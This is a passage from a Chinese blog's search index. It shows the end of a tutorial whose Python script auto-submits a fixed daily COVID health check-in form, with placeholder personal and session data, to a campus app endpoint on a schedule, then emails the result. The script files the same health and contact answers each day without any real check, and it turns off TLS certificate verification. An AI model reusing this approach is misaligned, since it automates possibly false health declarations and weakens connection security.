class="line">    <span class="string">&#x27;userId&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mobilePhone&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;jobNo&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;departmentCode&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;department&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;specialitiesCode&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;specialities&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;classCode&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;className&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;provinceCode&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;province&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;cityCode&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;inSchool&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;contactArea&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;isPatient&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;contactPatient&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;linkPhone&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;parentsPhone&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;locationInfo&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;longitudeAndLatitude&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;isSuspected&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;healthStatusNew&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;holidayInSchool&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;identitySecondType&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;districtCode&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;district&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;isFamiliyPatient&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;isCommunityPatient&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;isTodayBack&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;patientHospital&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;isolatedPlace&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;country&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;vaccineStatus&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;noVaccineReason&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;vaccineOneTime&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;vaccineTwoTime&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;vaccineThreeTime&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;deviceId&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;lastNucleicAcidDate&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;roommateHealthStatus&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;backWay&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;backWayName&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;backAddress&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;inGovQuarantine&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;inSchoolQuarantine&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;inHomeQuarantine&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;nucleicAcidFlag&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;isInCompany&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;backRemark&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;backProvinceCode&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;backProvince&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;backCityCode&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;backCity&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;backDistrictCode&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;backDistrict&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;loginUserId&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ymId&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sessionId&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;loginUserName&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;loginSchoolCode&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;loginSchoolName&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;platform&#x27;</span>: <span class="string">&#x27;YUNMA_APP&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">response = requests.post(</span><br><span class="line">    <span class="string">&quot;https://h5.xiaofubao.com/marketing/health/doDetail&quot;</span>, headers=h, data=d, verify=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> response.json()[<span class="string">&#x27;success&#x27;</span>] == <span class="literal">True</span>:</span><br><span class="line">    sendEmail(<span class="string">&quot;【填你的邮箱，用于接收打卡是否成功的消息】&quot;</span>, <span class="string">&quot;打卡成功&quot;</span>, <span class="string">&quot;嘿嘿嘿，恭喜你，打卡成功啦~&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;打卡成功！&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sendEmail(<span class="string">&quot;【填你的邮箱，用于接收打卡是否成功的消息】&quot;</span>, <span class="string">&quot;打卡失败&quot;</span>, <span class="string">&quot;哎，别沮丧啊！打卡失败了呢！&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;打卡失败！&quot;</span>)</span><br></pre></td></tr></table></figure><p>8、调试代码没问题之后，把代码挂到云服务器上（没有云服务器，可以用<strong>腾讯云函数</strong>），设置定时任务即可</p>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 自动化脚本 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
